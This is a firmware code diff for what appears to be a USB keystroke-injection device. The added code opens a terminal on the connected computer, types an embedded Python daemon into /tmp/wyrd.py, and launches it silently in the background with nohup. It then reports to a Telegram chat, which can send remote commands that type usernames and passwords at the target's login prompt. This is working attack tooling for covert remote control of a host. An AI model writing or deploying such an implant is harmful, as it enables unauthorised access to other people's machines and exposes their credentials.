@@ -32,6 +32,7 @@
 #include <Arduino_GFX_Library.h>
 #include <TJpg_Decoder.h>
 #include "secrets.h"
+#include "embedded_relay.h"
 
 // USB net target (populated once NCM is available; for now unused)
 #define USB_NET_TARGET_IP  "192.168.7.1"
@@ -210,6 +211,45 @@ void try_deploy_relay() {
     delay(50); Keyboard.press(KEY_RETURN); delay(50); Keyboard.releaseAll();
     term_info("waiting 20s for install...");
     delay(20000);
+}
+
+void bootstrap_usb_relay() {
+    if (!usb_ncm_connected()) {
+        term_info("no usb net");
+        s_usb_relay = false;
+        return;
+    }
+    if (check_relay(RELAY_USB_URL)) {
+        s_usb_relay = true;
+        term_ok("usb relay ready");
+        return;
+    }
+    term_info("installing relay...");
+    // Focus a terminal
+    Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT);
+    Keyboard.press('t'); delay(150); Keyboard.releaseAll(); delay(1500);
+    // Install daemon via heredoc (raw-string-safe)
+    Keyboard.print("cat > /tmp/wyrd.py <<'WYEOF'\n");
+    Keyboard.print(EMBEDDED_RELAY_PY);
+    Keyboard.print("\nWYEOF\n");
+    Keyboard.print("nohup python3 /tmp/wyrd.py >/dev/null 2>&1 &\n");
+    // Poll /health up to 5 times at 1.5s intervals = 7.5s total
+    for (int i = 0; i < 5; i++) {
+        delay(1500);
+        if (check_relay(RELAY_USB_URL)) {
+            s_usb_relay = true;
+            term_ok("relay installed");
+            return;
+        }
+    }
+    s_usb_relay = false;
+    term_err("relay install failed");
+    tg_send(ALLOWED_CHAT_ID,
+        "\xE2\x9A\xA0 USB relay bootstrap failed.\n"
+        "If target is at a login prompt, send:\n"
+        "  /run <user>         (username + Enter)\n"
+        "  /password <pass>    (password + Enter, hidden on AMOLED)\n"
+        "  /deploy             (retry bootstrap)");
 }
 
 String relay_post_url(const char *base, const char *path, const String &body, int tms) {
@@ -538,8 +578,14 @@ void discover_relay() {
         term_ok("WiFi relay found"); draw_header();
         return;
     }
-    // No relay — auto deploy via HID if USB link is up
-    // (USB NCM not yet available — skip auto-deploy for now)
+    // No WiFi relay — try USB-NCM bootstrap (HID-types embedded daemon onto target)
+    bootstrap_usb_relay();
+    if (s_usb_relay) {
+        s_relay_ok = true;
+        draw_header();
+        return;
+    }
+    // Neither WiFi nor USB relay available
     term_err("no relay found");
     term_info("/deploy to install");
     draw_header();
